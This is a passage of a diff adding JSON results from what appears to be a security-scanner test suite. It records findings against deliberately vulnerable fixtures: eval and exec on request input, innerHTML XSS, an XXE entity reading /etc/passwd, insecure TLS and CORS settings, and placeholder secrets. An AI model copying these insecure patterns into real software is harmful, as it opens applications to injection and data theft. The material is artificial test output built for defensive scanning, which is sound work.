+                                                              "10:      \"purl\": \"pkg:npm/lodash@4.17.20\",",
+                                                              "25:      \"dependsOn\": [\"pkg:npm/lodash@4.17.20\", \"pkg:npm/minimist@0.0.8\"]",
+                                                              "28:      \"ref\": \"pkg:npm/lodash@4.17.20\","
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-sca-dependencies",
+                                             "signal":  "CVE-2021-23337",
+                                             "targets":  [
+                                                             "package.json",
+                                                             "package-lock.json",
+                                                             "sbom/cyclonedx.json"
+                                                         ],
+                                             "category":  "SCA / Dependencies",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "12:        { \"name\": \"known_cve\", \"value\": \"CVE-2021-23337\" }"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-security-headers",
+                        "category":  "Security Headers",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-security-headers",
+                                             "signal":  "X-Powered-By",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "nginx.conf"
+                                                         ],
+                                             "category":  "Security Headers",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "3:  add_header X-Powered-By \"Express\";"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-security-headers",
+                                             "signal":  "Access-Control-Allow-Origin \"*\"",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "nginx.conf"
+                                                         ],
+                                             "category":  "Security Headers",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "4:  add_header Access-Control-Allow-Origin \"*\";"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-security-headers",
+                                             "signal":  "helmet({ contentSecurityPolicy: false",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "nginx.conf"
+                                                         ],
+                                             "category":  "Security Headers",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "16:app.use(helmet({ contentSecurityPolicy: false }));"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-static-analysis",
+                        "category":  "Static Analysis",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-static-analysis",
+                                             "signal":  "eval(req.body.expression)",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "src/client.js"
+                                                         ],
+                                             "category":  "Static Analysis",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "48:  res.json({ result: eval(req.body.expression) });"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-static-analysis",
+                                             "signal":  "exec(\u0027convert \u0027 + req.query.file",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "src/client.js"
+                                                         ],
+                                             "category":  "Static Analysis",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "52:  exec(\u0027convert \u0027 + req.query.file + \u0027 output.png\u0027, (err) =\u003e {"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-static-analysis",
+                                             "signal":  "innerHTML",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "src/client.js"
+                                                         ],
+                                             "category":  "Static Analysis",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "2:  document.getElementById(\u0027profile\u0027).innerHTML = user.bio;"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-toml-security",
+                        "category":  "File Formats",
+                        "expectedSignals":  7,
+                        "issuesFound":  7,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "host = \"0.0.0.0\"",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "2:host = \"0.0.0.0\""
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "debug = true",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "3:debug = true"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "tls = false",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "4:tls = false"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "verify_ssl = false",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "5:verify_ssl = false"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "api_key = \"toml_TEST_SECRET_12345\"",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "6:api_key = \"toml_TEST_SECRET_12345\""
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "allowed_origins = [\"*\"]",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "7:allowed_origins = [\"*\"]"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "url = \"http://packages.example.invalid/simple\"",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "10:url = \"http://packages.example.invalid/simple\""
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-xml-security",
+                        "category":  "File Formats",
+                        "expectedSignals":  6,
+                        "issuesFound":  6,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "3:  \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "\u003csecurity-enabled\u003efalse\u003c/security-enabled\u003e",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "6:  \u003csecurity-enabled\u003efalse\u003c/security-enabled\u003e"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "\u003cauth-method\u003eNONE\u003c/auth-method\u003e",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "7:  \u003cauth-method\u003eNONE\u003c/auth-method\u003e"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "\u003ctransport-guarantee\u003eNONE\u003c/transport-guarantee\u003e",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "8:  \u003ctransport-guarantee\u003eNONE\u003c/transport-guarantee\u003e"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "\u003cpassword\u003exml_TEST_SECRET_12345\u003c/password\u003e",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "9:  \u003cpassword\u003exml_TEST_SECRET_12345\u003c/password\u003e"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "debug=\"true\"",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "5:\u003cconfig debug=\"true\"\u003e"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-yaml-security",
+                        "category":  "File Formats",
+                        "expectedSignals":  7,
+                        "issuesFound":  7,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "auth: false",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "2:  auth: false"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "host: \"0.0.0.0\"",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "3:  host: \"0.0.0.0\""
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "allowedOrigins: [\"*\"]",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "4:  allowedOrigins: [\"*\"]"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "tls: false",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "5:  tls: false"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "api_key: \"yaml_TEST_SECRET_12345\"",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "6:  api_key: \"yaml_TEST_SECRET_12345\""
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "privileged: true",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "8:  privileged: true"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "runAsUser: 0",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "9:  runAsUser: 0"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "threat-model-system",
+                        "category":  "Design / ASVS",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "threat-model-system",
+                                             "signal":  "Trust boundaries are TBD",
+                                             "targets":  [
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "10:inputs. Trust boundaries are TBD."
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "threat-model-system",
+                                             "signal":  "No abuse cases",
+                                             "targets":  [
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "14:- No abuse cases have been documented."
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "threat-model-system",
+                                             "signal":  "No documented data classification",
+                                             "targets":  [
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "15:- No documented data classification exists for user records, reset tokens, or"
+                                                          ]
+                                         }
+                                     ]
+                    }
+                ]
+}
